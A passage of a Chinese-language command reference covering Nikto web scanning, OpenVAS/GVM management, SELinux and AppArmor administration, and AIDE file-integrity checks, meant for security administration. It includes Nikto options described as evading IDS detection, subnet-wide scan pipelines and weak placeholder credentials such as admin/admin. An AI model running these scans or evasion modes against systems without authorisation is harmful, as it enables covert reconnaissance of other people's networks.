nikto -h example.com -p 80,443,8080,8443
```

**基本写法:循环批量扫描**
`for host in $(cat <文件>); do nikto -h $host; done`
```bash
# 使用 shell 循环批量扫描
for host in $(cat hosts.txt); do nikto -h $host -o "${host}_scan.html" -Format htm; done
```

**基本写法:并行批量扫描**
`cat <文件> | xargs -P <并发数> -I {} nikto -h {}`
```bash
# 使用 xargs 并行扫描多个主机
cat hosts.txt | xargs -P 4 -I {} nikto -h {} -ask no -o "{}.txt"
```

**基本写法:按端口批量扫描**
`for port in <端口列表>; do nikto -h <主机> -p $port; done`
```bash
# 对单个主机扫描多个端口
for port in 80 443 8080 8443; do nikto -h example.com -p $port -o "scan_${port}.txt"; done
```

---

## Nikto 输出与报告

**基本写法:输出为 CSV 格式**
`nikto -h <主机> -o <文件> -Format csv`
```bash
# 输出 CSV 格式扫描结果
nikto -h example.com -o scan.csv -Format csv
```

**基本写法:输出为 HTML 格式**
`nikto -h <主机> -o <文件> -Format htm`
```bash
# 输出 HTML 格式报告
nikto -h example.com -o report.html -Format htm
```

**基本写法:输出为 JSON 格式**
`nikto -h <主机> -o <文件> -Format json`
```bash
# 输出 JSON 格式便于后续处理
nikto -h example.com -o scan.json -Format json
```

**基本写法:输出到标准输出**
`nikto -h <主机> -Format txt`
```bash
# 输出纯文本到终端
nikto -h example.com -Format txt
```

**基本写法:输出到 SQLite 数据库**
`nikto -h <主机> -o <数据库文件> -Format sql`
```bash
# 存入 SQLite 数据库便于分析
nikto -h example.com -o results.db -Format sql
```

---

## Nikto 高级选项

**基本写法:启用互操作测试**
`nikto -h <主机> -mutate <选项>`
```bash
# 启用变异测试(1=测试所有方法 2=测试目录字典)
nikto -h example.com -mutate 2
```

**基本写法:使用自定义字典**
`nikto -h <主机> -mutate <选项> -mutate-options <字典文件>`
```bash
# 使用自定义字典测试目录
nikto -h example.com -mutate 3 -mutate-options custom_dirs.txt
```

**基本写法:启用强制浏览**
`nikto -h <主机> -mutate 6 -mutate-options <目录列表>`
```bash
# 强制浏览特定目录列表
nikto -h example.com -mutate 6 -mutate-options admin,test,backup
```

**基本写法:使用 evasion 选项**
`nikto -h <主机> -evasion <编号>`
```bash
# 启用绕过 IDS 检测的 evasion 模式
# 1=随机 URI 编码 2=目录自引用 3=提前结束 URL 4=长 URL 5=伪造参数 6=使用 TAB 7=使用空格 8=大小写
nikto -h example.com -evasion 1
```

**基本写法:组合 evasion 模式**
`nikto -h <主机> -evasion <组合>`
```bash
# 组合多种 evasion 技术
nikto -h example.com -evasion 18
```

---

## Nikto 插件与配置

**基本写法:启用特定插件**
`nikto -h <主机> -Plugins <插件名>`
```bash
# 仅运行指定插件
nikto -h example.com -Plugins "apacheusers;reporting"
```

**基本写法:列出所有插件**
`nikto -list-plugins`
```bash
# 列出所有可用插件
nikto -list-plugins
```

**基本写法:使用配置文件**
`nikto -h <主机> -config <配置文件>`
```bash
# 使用自定义配置文件
nikto -h example.com -config /etc/nikto.conf
```

**基本写法:更新 Nikto 数据库**
`nikto -update`
```bash
# 更新 Nikto 扫描数据库
nikto -update
```

**基本写法:查看 Nikto 版本**
`nikto -Version`
```bash
# 查看 Nikto 版本信息
nikto -Version
```

---

## Nikto 扫描结果分析

**基本写法:统计漏洞数量**
`grep -c "OSVDB" <报告文件>`
```bash
# 统计发现的漏洞数量
grep -c "OSVDB" scan_result.txt
```

**基本写法:提取高危漏洞**
`grep -i "high\|critical" <报告文件>`
```bash
# 提取高危漏洞信息
grep -iE "high|critical|risk" scan_result.txt
```

**基本写法:提取特定漏洞类型**
`grep -i "sql\|xss\|rce" <报告文件>`
```bash
# 提取 SQL 注入、XSS、远程命令执行漏洞
grep -iE "sql injection|xss|remote code|command execution" scan_result.txt
```

**基本写法:JSON 结果解析**
`python3 -c "import json; data=json.load(open('<文件>')); print(len(data.get('vulnerabilities',[])))"`
```bash
# 解析 JSON 结果统计漏洞数
python3 -c "import json; data=json.load(open('scan.json')); print('漏洞数:', len(data.get('vulnerabilities',[])))"
```

**基本写法:生成扫描摘要**
`nikto -h <主机> -Display 1 | tail -5`
```bash
# 显示扫描摘要信息
nikto -h example.com -Display 1 | grep -E "entries|tested"
```

---

## Nikto 自动化集成

**基本写法:结合 cron 定时扫描**
`0 2 * * * nikto -h <主机> -o <文件>`
```bash
# 每天凌晨 2 点自动扫描
# 0 2 * * * nikto -h example.com -ask no -o /var/log/nikto/scan_$(date +\%F).html -Format htm
```

**基本写法:结合邮件通知**
`nikto -h <主机> -o <文件> && mail -s "扫描报告" <邮箱> < <文件>`
```bash
# 扫描完成后发送邮件
nikto -h example.com -o scan.txt -Format txt && mail -s "Nikto 扫描报告" admin@example.com < scan.txt
```

**基本写法:与 nmap 联动扫描**
`nmap -p 80,443 <目标> -oG - | awk '/80\|443/{print $2}' | nikto -h -`
```bash
# nmap 发现端口后用 Nikto 深入扫描
nmap -p 80,443 192.168.1.0/24 -oG - | awk '/Up/{print $2}' | xargs -I {} nikto -h {} -ask no
```

**基本写法:输出到 ELK 系统**
`nikto -h <主机> -Format json | python3 <转换脚本>`
```bash
# 输出 JSON 供 ELK 系统分析
nikto -h example.com -Format json -o - | python3 -c "import sys,json; print(json.dumps(json.load(sys.stdin),indent=2))"
```

**基本写法:与 OWASP Dependency Check 联动**
`nikto -h <主机> -o <文件> -Format json && dependency-check --scan <应用>`
```bash
# 组合 Nikto 与依赖检查全面评估
nikto -h example.com -o web_scan.json -Format json && dependency-check --scan ./target/app.jar --out dep_report
```



<!-- ============ 文档分隔线：033-cybersecurity/055-OpenVASCommands.md ============ -->


## OpenVAS/GVM 服务管理

**基本写法:启动 GVM 服务**
`gvm-start`
```bash
# 启动 Greenbone 漏洞管理服务
gvm-start
```

**基本写法:停止 GVM 服务**
`gvm-stop`
```bash
# 停止 GVM 所有服务
gvm-stop
```

**基本写法:查看服务状态**
`gvm-check-setup`
```bash
# 检查 GVM 安装与运行状态
gvm-check-setup
```

**基本写法:重启 GVM 服务**
`systemctl restart gvmd`
```bash
# 重启 gvmd 服务
sudo systemctl restart gvmd
sudo systemctl restart ospd-openvas
```

**基本写法:查看日志**
`journalctl -u gvmd -f`
```bash
# 实时查看 gvmd 服务日志
sudo journalctl -u gvmd -f
```

---

## gvm-tools 命令行操作

**基本写法:安装 gvm-tools**
`pip3 install gvm-tools`
```bash
# 安装 gvm-tools 命令行工具
pip3 install gvm-tools
```

**基本写法:连接 GVM**
`gvm-cli tls --hostname <主机> --port 9390 --gmp-username <用户> --gmp-password <密码>`
```bash
# 连接 GVM 服务(交互式)
gvm-cli tls --hostname 127.0.0.1 --port 9390 --gmp-username admin --gmp-password admin
```

**基本写法:执行 GMP 命令**
`gvm-cli tls --hostname <主机> --port 9390 --gmp-username <用户> --gmp-password <密码> --xml "<命令>"`
```bash
# 执行 GMP XML 命令获取版本
gvm-cli tls --hostname 127.0.0.1 --port 9390 --gmp-username admin --gmp-password admin --xml "<get_version/>"
```

**基本写法:从文件执行命令**
`gvm-cli tls --hostname <主机> --gmp-username <用户> --gmp-password <密码> <文件>`
```bash
# 从 XML 文件批量执行命令
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin commands.xml
```

**基本写法:使用 pyshell**
`gvm-pyshell --hostname <主机> --port 9390 --gmp-username <用户> --gmp-password <密码>`
```bash
# 启动交互式 Python Shell
gvm-pyshell tls --hostname 127.0.0.1 --port 9390 --gmp-username admin --gmp-password admin
```

---

## 目标与任务管理

**基本写法:创建目标**
`gvm-cli ... --xml "<create_target><name><名称></name><hosts><主机></hosts></create_target>"`
```bash
# 创建扫描目标
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<create_target><name>Target1</name><hosts>192.168.1.10</hosts></create_target>'
```

**基本写法:列出所有目标**
`gvm-cli ... --xml "<get_targets/>"`
```bash
# 获取所有扫描目标
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_targets/>'
```

**基本写法:创建扫描任务**
`gvm-cli ... --xml "<create_task><name>...</name><target id="..."/><config id="..."/></create_task>"`
```bash
# 创建扫描任务
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<create_task><name>Scan1</name><target id="target-id"/><config id="config-id"/><scanner id="scanner-id"/></create_task>'
```

**基本写法:启动扫描任务**
`gvm-cli ... --xml "<start_task task_id="<任务ID>"/>"`
```bash
# 启动指定扫描任务
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<start_task task_id="task-id"/>'
```

**基本写法:查看任务状态**
`gvm-cli ... --xml "<get_tasks task_id="<任务ID>"/>"`
```bash
# 查看任务执行状态
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_tasks task_id="task-id"/>'
```

---

## 扫描配置管理

**基本写法:列出扫描配置**
`gvm-cli ... --xml "<get_configs/>"`
```bash
# 获取所有可用扫描配置
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_configs/>'
```

**基本写法:查看配置详情**
`gvm-cli ... --xml "<get_configs config_id="<配置ID>"/>"`
```bash
# 查看指定扫描配置详情
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_configs config_id="config-id"/>'
```

**基本写法:导入扫描配置**
`gvm-cli ... --xml "<create_config><get_configs_response>...</create_config>"`
```bash
# 从 XML 导入扫描配置
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml config.xml
```

**基本写法:导出扫描配置**
`gvm-cli ... --xml "<get_configs config_id="<配置ID>" details="1"/>" > <文件>`
```bash
# 导出扫描配置到 XML 文件
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_configs config_id="config-id" details="1"/>' > config.xml
```

---

## 扫描结果与报告

**基本写法:获取扫描结果**
`gvm-cli ... --xml "<get_results task_id="<任务ID>"/>"`
```bash
# 获取任务扫描结果
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_results task_id="task-id"/>'
```

**基本写法:获取报告**
`gvm-cli ... --xml "<get_reports report_id="<报告ID>"/>"`
```bash
# 获取指定报告详情
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_reports report_id="report-id"/>'
```

**基本写法:导出 PDF 报告**
`gvm-cli ... --xml '<get_reports report_id="<报告ID>" format_id="..."/>' > <文件>`
```bash
# 导出 PDF 格式报告
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_reports report_id="report-id" format_id="pdf-format-id"/>' > report.pdf
```

**基本写法:导出 XML 报告**
`gvm-cli ... --xml '<get_reports report_id="<报告ID>"/>' > <文件>`
```bash
# 导出 XML 格式报告
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_reports report_id="report-id"/>' > report.xml
```

**基本写法:获取漏洞详情**
`gvm-cli ... --xml '<get_results result_id="<结果ID>"/>'`
```bash
# 获取单个漏洞详情
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_results result_id="result-id" details="1"/>'
```

---

## NVT 更新管理

**基本写法:更新 NVT 漏洞库**
`greenbone-nvt-sync`
```bash
# 同步 NVT 漏洞检测脚本库
sudo greenbone-nvt-sync
```

**基本写法:更新 SCAP 数据**
`greenbone-scapdata-sync`
```bash
# 同步 SCAP 安全内容数据
sudo greenbone-scapdata-sync
```

**基本写法:更新 CERT 数据**
`greenbone-certdata-sync`
```bash
# 同步 CERT 通告数据
sudo greenbone-certdata-sync
```

**基本写法:更新 GVMD 数据**
`greenbone-feed-sync --type <类型>`
```bash
# 同步指定类型的数据源
sudo greenbone-feed-sync --type gvmd-data
```

**基本写法:查看同步状态**
`gvmd --rebuild-gvmd-data=all`
```bash
# 重建 gvmd 数据缓存
sudo gvmd --rebuild-gvmd-data=all
```

---

## 凭据与认证管理

**基本写法:创建凭据**
`gvm-cli ... --xml '<create_credential><name>...</name><login>...</login><password>...</password></create_credential>'`
```bash
# 创建扫描使用的认证凭据
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<create_credential><name>SSH-Cred</name><login>root</login><password>password</password><type>up</type></create_credential>'
```

**基本写法:列出所有凭据**
`gvm-cli ... --xml '<get_credentials/>'`
```bash
# 获取所有已创建凭据
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_credentials/>'
```

**基本写法:为目标添加凭据**
`gvm-cli ... --xml '<modify_target target_id="..."><ssh_credential credential_id="..."/>...'`
```bash
# 为扫描目标关联 SSH 凭据
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<modify_target target_id="target-id"><ssh_credential credential_id="cred-id" port="22"/></modify_target>'
```

**基本写法:创建管理员用户**
`gvmd --create-user=<用户> --password=<密码> --role=Admin`
```bash
# 创建 GVM 管理员账户
sudo gvmd --create-user=scanner --password=scanner123 --role=Admin
```

**基本写法:删除用户**
`gvmd --delete-user=<用户>`
```bash
# 删除 GVM 用户
sudo gvmd --delete-user=scanner
```

---

## 调度任务管理

**基本写法:创建定时扫描**
`gvm-cli ... --xml '<create_schedule><name>...</name><first_time>...</first_time></create_schedule>'`
```bash
# 创建定时扫描任务
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<create_schedule><name>Daily-Scan</name><first_time><minute>0</minute><hour>2</hour><day_of_month>1</day_of_month><month>1</month><year>2026</year></first_time><period><hour>24</hour></period></create_schedule>'
```

**基本写法:列出所有调度**
`gvm-cli ... --xml '<get_schedules/>'`
```bash
# 获取所有定时任务
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_schedules/>'
```

**基本写法:为任务关联调度**
`gvm-cli ... --xml '<modify_task task_id="..."><schedule id="..."/></modify_task>'`
```bash
# 关联调度到扫描任务
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<modify_task task_id="task-id"><schedule id="schedule-id"/></modify_task>'
```

**基本写法:停止运行中任务**
`gvm-cli ... --xml '<stop_task task_id="<任务ID>"/>'`
```bash
# 停止运行中的扫描任务
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<stop_task task_id="task-id"/>'
```

---

## 报告格式与导出

**基本写法:列出报告格式**
`gvm-cli ... --xml '<get_report_formats/>'`
```bash
# 获取所有可用报告格式
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_report_formats/>'
```

**基本写法:导出 CSV 报告**
`gvm-cli ... --xml '<get_reports report_id="<报告ID>" format_id="..."/>' > <文件>`
```bash
# 导出 CSV 格式报告
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_reports report_id="report-id" format_id="csv-format-id"/>' > report.csv
```

**基本写法:导出 HTML 报告**
`gvm-cli ... --xml '<get_reports report_id="<报告ID>" format_id="..."/>' > <文件>`
```bash
# 导出 HTML 格式报告
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_reports report_id="report-id" format_id="html-format-id"/>' > report.html
```

**基本写法:解析 JSON 结果**
`python3 -c "import json; data=json.load(open('<文件>')); print(len(data['report']['results']))"`
```bash
# 解析 JSON 报告统计漏洞数
python3 -c "import json; data=json.load(open('report.json')); print('漏洞数:', len(data['report']['results']))"
```

---

## OpenVAS 自动化集成

**基本写法:Python 脚本调用**
`python3 -c "from gvm.connections import TLSConnection; ..."`
```bash
# Python 脚本调用 GVM API
python3 -c "
from gvm.connections import TLSConnection
from gvm.protocols.gmp import Gmp
connection = TLSConnection(hostname='127.0.0.1', port=9390)
gmp = Gmp(connection)
gmp.authenticate('admin', 'admin')
print(gmp.get_version())
"
```

**基本写法:批量扫描脚本**
`for host in $(cat <文件>); do gvm-cli ... --xml "<create_target>...</create_target>"; done`
```bash
# 批量创建扫描目标
for host in $(cat hosts.txt); do
  gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml "<create_target><name>$host</name><hosts>$host</hosts></create_target>"
done
```

**基本写法:结合邮件通知**
`gvm-cli ... --xml '<get_reports/>' | mail -s "扫描报告" <邮箱>`
```bash
# 扫描完成后邮件通知
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_reports report_id="report-id"/>' | mail -s "OpenVAS 扫描报告" admin@example.com
```

**基本写法:与 SIEM 集成**
`gvm-cli ... --xml '<get_results/>' | python3 <解析脚本>`
```bash
# 提取结果发送到 SIEM
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<get_results task_id="task-id"/>' | python3 parse_results.py | curl -X POST -d @- http://siem:9200/vulns/_bulk
```

---

## OpenVAS 性能与维护

**基本写法:调整扫描并发**
`gvm-cli ... --xml '<modify_config config_id="..."><preference><name>...</name><value>...</value></preference></modify_config>'`
```bash
# 调整最大并发 NVT 数量
gvm-cli tls --hostname 127.0.0.1 --gmp-username admin --gmp-password admin --xml '<modify_config config_id="config-id"><preference><name>Max concurrently executed NVTs per host</name><value>10</value></preference></modify_config>'
```

**基本写法:重建数据库**
`gvmd --rebuild`
```bash
# 重建 gvmd 数据库
sudo gvmd --rebuild
```

**基本写法:清理数据库**
`gvmd --optimize`
```bash
# 优化数据库性能
sudo gvmd --optimize
```

**基本写法:查看磁盘使用**
`du -sh /var/lib/gvm/*`
```bash
# 查看 GVM 数据目录磁盘占用
du -sh /var/lib/gvm/*
```



<!-- ============ 文档分隔线：033-cybersecurity/056-SELinuxAppArmor.md ============ -->


## SELinux 状态管理

**基本写法:查看 SELinux 状态**
`getenforce`
```bash
# 查看 SELinux 当前模式
getenforce
```

**基本写法:查看详细状态**
`sestatus`
```bash
# 查看 SELinux 详细状态与策略版本
sestatus
```

**基本写法:临时设置为 Enforcing**
`setenforce 1`
```bash
# 临时启用强制模式(重启失效)
sudo setenforce 1
```

**基本写法:临时设置为 Permissive**
`setenforce 0`
```bash
# 临时设为宽容模式(仅记录不拦截)
sudo setenforce 0
```

**基本写法:永久修改模式**
`sed -i 's/SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config`
```bash
# 永久设置为强制模式(需重启生效)
sudo sed -i 's/SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config
```

---

## SELinux 上下文管理

**基本写法:查看文件上下文**
`ls -Z <文件>`
```bash
# 查看文件的安全上下文
ls -Z /var/www/html/
```

**基本写法:查看进程上下文**
`ps -eZ | grep <进程名>`
```bash
# 查看进程的安全上下文
ps -eZ | grep nginx
```

**基本写法:修改文件上下文**
`chcon -t <类型> <文件>`
```bash
# 修改文件安全上下文类型
sudo chcon -t httpd_sys_content_t /var/www/html/index.html
```

**基本写法:递归修改上下文**
`chcon -R -t <类型> <目录>`
```bash
# 递归修改目录下所有文件上下文
sudo chcon -R -t httpd_sys_content_t /var/www/html/
```

**基本写法:恢复默认上下文**
`restorecon -Rv <目录>`
```bash
# 恢复文件到策略定义的默认上下文
sudo restorecon -Rv /var/www/html/
```

---

## SELinux 策略管理

**基本写法:查看策略包**
`semodule -l`
```bash
# 列出所有已安装的策略模块
sudo semodule -l
```

**基本写法:安装策略模块**
`semodule -i <模块文件>`
```bash
# 安装编译好的策略模块
sudo semodule -i mypolicy.pp
```

**基本写法:移除策略模块**
`semodule -r <模块名>`
```bash
# 移除已安装的策略模块
sudo semodule -r mypolicy
```

**基本写法:查看布尔值**
`getsebool -a`
```bash
# 列出所有布尔值开关
getsebool -a
```

**基本写法:设置布尔值**
`setsebool -P <布尔值> <on|off>`
```bash
# 永久启用 HTTPD 网络连接(需 -P 持久化)
sudo setsebool -P httpd_can_network_connect on
```

---

## SELinux 策略生成

**基本写法:生成策略模板**
`sepolgen <程序路径>`
```bash
# 为程序生成 SELinux 策略模板
sepolgen /usr/local/bin/myapp
```

**基本写法:使用 audit2allow 生成策略**
`audit2allow -a -m <模块名> -o <文件>`
```bash
# 从审计日志生成允许规则策略
sudo audit2allow -a -m myapp -o myapp.te
```

**基本写法:编译策略模块**
`checkmodule -M -m -o <模块名>.mod <模块名>.te`
```bash
# 编译 TE 文件为模块
checkmodule -M -m -o myapp.mod myapp.te
```

**基本写法:打包策略模块**
`semodule_package -o <模块名>.pp -m <模块名>.mod`
```bash
# 打包模块为可安装的 pp 文件
semodule_package -o myapp.pp -m myapp.mod
```

**基本写法:一键生成并安装**
`audit2allow -a -M <模块名> && semodule -i <模块名>.pp`
```bash
# 从审计日志一键生成并安装策略
sudo audit2allow -a -M myapp && sudo semodule -i myapp.pp
```

---

## SELinux 故障排查

**基本写法:查看 AVC 拒绝日志**
`ausearch -m avc -ts recent`
```bash
# 查看最近的 SELinux AVC 拒绝记录
sudo ausearch -m avc -ts recent
```

**基本写法:实时监控 AVC 日志**
`tail -f /var/log/audit/audit.log | grep AVC`
```bash
# 实时监控 SELinux 拒绝事件
sudo tail -f /var/log/audit/audit.log | grep AVC
```

**基本写法:统计拒绝类型**
`aureport -a | head -20`
```bash
# 统计 AVC 拒绝事件排行
sudo aureport -a | head -20
```

**基本写法:生成可读报告**
`sealert -a /var/log/audit/audit.log`
```bash
# 使用 sealert 分析并生成可读报告
sudo sealert -a /var/log/audit/audit.log > sealert.txt
```

**基本写法:查看进程 AVC 拒绝**
`grep "avc:.*denied" /var/log/audit/audit.log | grep "<进程名>"`
```bash
# 查看特定进程的 SELinux 拒绝
sudo grep "avc:.*denied" /var/log/audit/audit.log | grep "nginx"
```

---

## AppArmor 状态管理

**基本写法:查看 AppArmor 状态**
`apparmor_status`
```bash
# 查看 AppArmor 运行状态
sudo apparmor_status
```

**基本写法:启动 AppArmor 服务**
`systemctl start apparmor`
```bash
# 启动 AppArmor 服务
sudo systemctl start apparmor
sudo systemctl enable apparmor
```

**基本写法:查看加载的配置文件**
`apparmor_status --profiled`
```bash
# 查看已加载的配置文件数量
apparmor_status --profiled
```

**基本写法:查看进程关联的配置**
`aa-status`
```bash
# 查看各进程的 AppArmor 模式
sudo aa-status
```

**基本写法:查看特定进程模式**
`cat /proc/<pid>/attr/current`
```bash
# 查看指定进程的 AppArmor 模式
cat /proc/1234/attr/current
```

---

## AppArmor 配置文件管理

**基本写法:列出所有配置文件**
`ls /etc/apparmor.d/`
```bash
# 列出所有 AppArmor 配置文件
ls -l /etc/apparmor.d/
```

**基本写法:加载配置文件**
`apparmor_parser -r /etc/apparmor.d/<配置>`
```bash
# 重新加载指定配置文件
sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx
```

**基本写法:卸载配置文件**
`apparmor_parser -R /etc/apparmor.d/<配置>`
```bash
# 卸载指定配置文件
sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.nginx
```

**基本写法:设置 complain 模式**
`aa-complain /etc/apparmor.d/<配置>`
```bash
# 将配置设为告警模式(仅记录不拦截)
sudo aa-complain /etc/apparmor.d/usr.sbin.nginx
```

**基本写法:设置 enforce 模式**
`aa-enforce /etc/apparmor.d/<配置>`
```bash
# 将配置设为强制模式
sudo aa-enforce /etc/apparmor.d/usr.sbin.nginx
```

---

## AppArmor 配置生成

**基本写法:生成配置模板**
`aa-genprof <程序路径>`
```bash
# 为程序生成 AppArmor 配置文件
sudo aa-genprof /usr/local/bin/myapp
```

**基本写法:更新现有配置**
`aa-logprof`
```bash
# 分析日志并更新现有配置
sudo aa-logprof
```

**基本写法:自动学习模式**
`aa-autodep <程序路径>`
```bash
# 自动生成依赖项配置
sudo aa-autodep /usr/local/bin/myapp
```

**基本写法:配置文件语法检查**
`apparmor_parser -Q -T /etc/apparmor.d/<配置>`
```bash
# 测试配置文件语法
sudo apparmor_parser -Q -T /etc/apparmor.d/usr.sbin.nginx
```

---

## AppArmor 日志审计

**基本写法:查看 AppArmor 日志**
`tail -f /var/log/syslog | grep -i apparmor`
```bash
# 实时查看 AppArmor 日志
sudo tail -f /var/log/syslog | grep -i apparmor
```

**基本写法:查看拒绝事件**
`grep "DENIED" /var/log/syslog | grep apparmor`
```bash
# 查看 AppArmor 拒绝事件
sudo grep "DENIED" /var/log/syslog | grep apparmor
```

**基本写法:统计拒绝次数**
`grep "DENIED" /var/log/syslog | grep -oE "profile=[^ ]+" | sort | uniq -c`
```bash
# 统计各配置文件的拒绝次数
sudo grep "DENIED" /var/log/syslog | grep -oE "profile=[^ ]+" | sort | uniq -c | sort -rn
```

**基本写法:查看特定程序拒绝**
`dmesg | grep -i apparmor | grep <程序名>`
```bash
# 查看内核日志中的 AppArmor 拒绝
sudo dmesg | grep -i apparmor | grep nginx
```

---

## MAC 策略审计

**基本写法:SELinux 策略完整性检查**
`semodule --verify=extend`
```bash
# 验证 SELinux 策略完整性
sudo semodule --verify=extend
```

**基本写法:对比策略差异**
`sedismod <模块>`
```bash
# 反汇编策略模块查看规则
sedismod myapp.pp
```

**基本写法:查看策略允许规则**
`sesearch -A -s <源类型> -t <目标类型>`
```bash
# 查询源到目标类型的允许规则
sesearch -A -s httpd_t -t httpd_sys_content_t
```

**基本写法:查看策略布尔值影响**
`sesearch -A -b <布尔值>`
```bash
# 查询布尔值影响的规则
sesearch -A -b httpd_can_network_connect
```

**基本写法:AppArmor 配置审计**
`aa-status --audit`
```bash
# 审计 AppArmor 配置完整性
sudo aa-status
```

---

## MAC 与服务集成

**基本写法:为 Web 服务启用 SELinux**
`setsebool -P httpd_enable_homedirs on`
```bash
# 允许 HTTPD 访问用户主目录
sudo setsebool -P httpd_enable_homedirs on
```

**基本写法:为数据库启用 SELinux**
`setsebool -P mysqld_disable_trans off`
```bash
# 启用 MySQL 的 SELinux 策略
sudo setsebool -P mysqld_disable_trans off
```

**基本写法:为 Nginx 配置 AppArmor**
`aa-enforce /etc/apparmor.d/usr.sbin.nginx`
```bash
# 启用 Nginx 的 AppArmor 强制模式
sudo aa-enforce /etc/apparmor.d/usr.sbin.nginx
```

**基本写法:为容器配置 SELinux**
`docker run --security-opt label:type:<类型> <镜像>`
```bash
# Docker 容器使用 SELinux 隔离
docker run --security-opt label:type:svirt_apache_t nginx
```

**基本写法:验证服务配置**
`getsebool -a | grep <服务名>`
```bash
# 查看 HTTPD 相关布尔值
getsebool -a | grep httpd
```



<!-- ============ 文档分隔线：033-cybersecurity/057-AIDEFileIntegrity.md ============ -->


## AIDE 安装与初始化

**基本写法:安装 AIDE**
`apt-get install aide`
```bash
# 安装 AIDE 文件完整性检查工具
sudo apt-get install aide
```

**基本写法:初始化 AIDE 数据库**
`aideinit`
```bash
# 初始化 AIDE 数据库(生成基础快照)
sudo aideinit
```

**基本写法:查看初始化输出**
`aideinit --output`
```bash
# 指定输出文件路径初始化
sudo aideinit --output /var/lib/aide/aide.db.new
```

**基本写法:手动生成数据库**
`aide --init`
```bash
# 手动初始化 AIDE 数据库
sudo aide --init
```

**基本写法:安装初始化数据库**
`cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db`
```bash
# 将新数据库设为当前基准数据库
sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
```

---

## AIDE 检查与比对

**基本写法:执行完整性检查**
`aide --check`
```bash
# 比对当前文件与基准数据库
sudo aide --check
```

**基本写法:更新数据库(检查并更新)**
`aide --update`
```bash
# 检查文件变化并更新数据库
sudo aide --update
```

**基本写法:检查并输出到文件**
`aide --check --report=file:<文件>`
```bash
# 检查结果输出到文件
sudo aide --check --report=file:/tmp/aide-report.txt
```

**基本写法:检查并输出为 HTML**
`aide --check --report=html > <文件>`
```bash
# 生成 HTML 格式检查报告
sudo aide --check > /tmp/aide-report.html
```

**基本写法:详细检查输出**
`aide --check --verbose 5`
```bash
# 显示详细检查信息
sudo aide --check --verbose 5
```

---

## AIDE 配置文件

**基本写法:查看配置文件**
`cat /etc/aide/aide.conf`
```bash
# 查看 AIDE 配置文件
cat /etc/aide/aide.conf
```

**基本写法:定义规则**
`<规则名> = <属性>`
```bash
# 在配置文件中定义规则
# PERMS = p+i+n+u+g+acl
# LOG = p+i+n+u+g+S
# CONTENT = p+i+n+u+g+s+m+c+acl+selinux+sha512
```

**基本写法:应用规则到路径**
`<路径> <规则>`
```bash
# 为指定路径应用规则
# /etc PERMS
# /var/log LOG
# /bin CONTENT
```

**基本写法:排除路径**
`!<路径>`
```bash
# 排除不需要检查的目录
# !/var/log/.*
# !/tmp/.*
# !/proc/.*
```

**基本写法:测试配置文件**
`aide --config-check`
```bash
# 检查配置文件语法
sudo aide --config-check
```

---

## AIDE 数据库管理

**基本写法:查看数据库版本**
`aide --version`
```bash
# 查看 AIDE 工具版本
aide --version
```

**基本写法:备份数据库**
`cp /var/lib/aide/aide.db /var/lib/aide/aide.db.bak.$(date +%F)`
```bash
# 备份基准数据库
sudo cp /var/lib/aide/aide.db /var/lib/aide/aide.db.bak.$(date +%F)
```

**基本写法:压缩存储数据库**
`gzip /var/lib/aide/aide.db.new`
```bash
# 压缩新数据库节省空间
sudo gzip /var/lib/aide/aide.db.new
```

**基本写法:验证数据库完整性**
`sha256sum /var/lib/aide/aide.db`
```bash
# 计算数据库哈希验证完整性
sha256sum /var/lib/aide/aide.db
```

**基本写法:数据库归档**
`tar -czf aide-archive-$(date +%F).tar.gz /var/lib/aide/`
```bash
# 归档数据库到安全位置
sudo tar -czf /backup/aide-archive-$(date +%F).tar.gz /var/lib/aide/
```

---

## AIDE 报告分析

**基本写法:查看变更摘要**
`grep -E "added|removed|changed" <报告文件>`
```bash
# 提取变更摘要统计
grep -E "added|removed|changed" /tmp/aide-report.txt
```

**基本写法:统计变更文件数**
`grep -c "changed:" <报告文件>`
```bash
# 统计变更文件数量
grep -c "changed:" /tmp/aide-report.txt
```

**基本写法:提取新增文件**
`grep "added:" <报告文件>`
```bash
# 提取所有新增文件
